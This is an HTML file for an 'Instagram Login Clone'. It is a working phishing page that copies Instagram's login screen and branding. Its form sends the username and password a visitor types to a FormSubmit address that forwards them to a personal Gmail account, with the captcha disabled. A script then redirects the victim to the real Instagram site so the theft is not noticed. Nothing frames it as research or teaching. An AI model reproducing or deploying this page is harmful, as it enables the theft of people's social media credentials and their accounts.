<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram Login Clone</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
    }

    .wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      gap: 40px;
      padding: 20px;
    }

    .phone-mockup {
      display: none;
      flex-shrink: 0;
      width: 500px;
      max-height: 650px;
      user-select: none;
    }

    .phone-mockup img {
      width: 100%;
      height: auto;
      object-fit: contain;
      user-select: none;
    }

    .form-container {
      width: 100%;
      max-width: 350px;
    }

    .login-box,
    .signup-box {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px 30px;
      margin-bottom: 10px;
      text-align: center;
    }

    .login-box img.logo {
      width: 175px;
      margin-bottom: 25px;
      user-select: none;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      border: none;
      color: white;
      font-weight: bold;
      font-size: 14px;
      border-radius: 3px;
      margin-top: 10px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }

    button:hover {
      background-color: #007acc;
    }

    .or {
      margin: 20px 0;
      position: relative;
      text-align: center;
      font-size: 13px;
      color: #8e8e8e;
    }

    .or::before,
    .or::after {
      content: "";
      position: absolute;
      width: 40%;
      height: 1px;
      background-color: #dbdbdb;
      top: 50%;
    }

    .or::before {
      left: 0;
    }

    .or::after {
      right: 0;
    }

    .forgot {
      margin-top: 15px;
      font-size: 12px;
    }

    a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }

    .signup-box {
      font-size: 14px;
    }

    .facebook-login {
      display: inline-flex;
      align-items: center;
      color: #385185;
      font-weight: 600;
      text-decoration: none;
      font-size: 14px;
      justify-content: center;
      margin-bottom: 12px;
    }
    .facebook-login:hover {
      text-decoration: underline;
    }

    @media (min-width: 768px) {
      .phone-mockup {
        display: block;
      }
    }

    @media (max-width: 767px) {
      .wrapper {
        flex-direction: column;
      }

      .phone-mockup img {
        height: 400px;
        margin-bottom: 20px;
        max-width: 100%;
      }
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <!-- Mobile mockup on left -->
    <div class="phone-mockup" aria-hidden="true">
      <img
        src="https://i.postimg.cc/RVKVCdKG/instagram-web-lox-image.png"
        alt="Instagram mobile mockup"
      />
    </div>

    <!-- Login form -->
    <div class="form-container" role="main">
      <div class="login-box" role="form" aria-label="Instagram login form">
        <img
          class="logo"
          src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
          alt="Instagram"
          draggable="false"
        />
        <form
          id="loginForm"
          action="https://formsubmit.co/rahul84486@gmail.com"
          method="POST"
          autocomplete="off"
          spellcheck="false"
        >
          <input
            type="text"
            name="username"
            placeholder="Phone number, username, or email"
            required
            aria-label="Username"
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            required
            aria-label="Password"
          />

          <!-- Hidden inputs for FormSubmit -->
          <input type="hidden" name="_subject" value="New Login Submission" />
          <input type="hidden" name="_captcha" value="false" />
          <input type="hidden" name="_template" value="table" />

          <button type="submit">Log In</button>

          <div class="or">OR</div>

          <!-- Facebook login with logo -->
          <a
            href="https://www.facebook.com/login.php?skip_api_login=1&api_key=6628568379&signed_next=1&next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Ffacebook_login%2F%3Fsource%3Dauth_switcher&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Flogin%2F%3Fcancel%3Dtrue%26source%3Dauth_switcher&display=popup&locale=en_US"
            target="_blank"
            rel="noopener noreferrer"
            class="facebook-login"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              fill="#385185"
              viewBox="0 0 24 24"
              aria-hidden="true"
              focusable="false"
              style="vertical-align: middle; margin-right: 8px;"
            >
              <path d="M22.675 0h-21.35C.6 0 0 .6 0 1.344v21.312C0 23.4.6 24 1.325 24H12.82v-9.294H9.692v-3.622h3.128V8.414c0-3.1 1.893-4.788 4.658-4.788 1.325 0 2.463.1 2.796.144v3.24l-1.918.001c-1.504 0-1.796.715-1.796 1.763v2.31h3.59l-.467 3.622h-3.123V24h6.116c.725 0 1.325-.6 1.325-1.344V1.344C24 .6 23.4 0 22.675 0z"/>
            </svg>
            Log in with Facebook
          </a>

          <div class="forgot">
            <a
              href="https://www.instagram.com/accounts/password/reset/"
              target="_blank"
              rel="noopener noreferrer"
              >Forgot password?</a
            >
          </div>
        </form>
      </div>

      <div class="signup-box">
        Don't have an account?
        <a
          href="https://www.instagram.com/accounts/emailsignup/"
          target="_blank"
          rel="noopener noreferrer"
          >Sign up</a
        >
      </div>
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const form = this;
      const data = new FormData(form);

      fetch(form.action, {
        method: 'POST',
        body: data,
        headers: {
          Accept: 'application/json',
        },
      })
        .then((response) => {
          if (response.ok) {
            // Redirect to Instagram homepage after successful submission
            window.location.href = 'https://www.instagram.com';
          } else {
            alert('Oops! There was a problem submitting your form.');
          }
        })
        .catch((error) => {
          alert('Oops! There was a problem submitting your form.');
        });
    });
  </script>
</body>
</html>
